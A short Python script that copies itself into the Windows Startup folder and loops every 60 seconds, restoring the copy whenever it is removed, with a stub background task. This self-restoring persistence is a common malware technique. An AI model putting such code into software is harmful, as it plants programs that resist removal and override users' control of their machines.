import os
import sys
import time
import shutil

def get_startup_folder():
    """Get the Windows Startup folder path for the current user."""
    return os.path.join(os.environ['APPDATA'], 'Microsoft', 'Windows', 'Start Menu', 'Programs', 'Startup')

def ensure_in_startup_folder(script_path):
    """Ensure the script is in the Windows Startup folder."""
    startup_folder = get_startup_folder()
    if not os.path.exists(startup_folder):
        print("Startup folder does not exist.")
        return False

    script_name = os.path.basename(script_path)
    startup_script_path = os.path.join(startup_folder, script_name)

    if not os.path.exists(startup_script_path):
        print(f"Copying {script_name} to Startup folder...")
        shutil.copy2(script_path, startup_script_path)

    return startup_script_path

def monitor_startup_presence(script_path):
    """Monitor and ensure the script remains in the startup folder."""
    startup_script_path = ensure_in_startup_folder(script_path)

    if not startup_script_path:
        print("Failed to ensure script is in Startup folder. Exiting...")
        sys.exit(1)

    while True:
        if not os.path.exists(startup_script_path):
            print("Script removed from Startup folder. Attempting to restore...")
            ensure_in_startup_folder(script_path)

        # Simulate doing some background task
        print("Running background task...")

        # Sleep for a specified interval to avoid high CPU usage
        time.sleep(60)  # Sleep for 60 seconds

if __name__ == "__main__":
    script_path = os.path.abspath(__file__)
    monitor_startup_presence(script_path)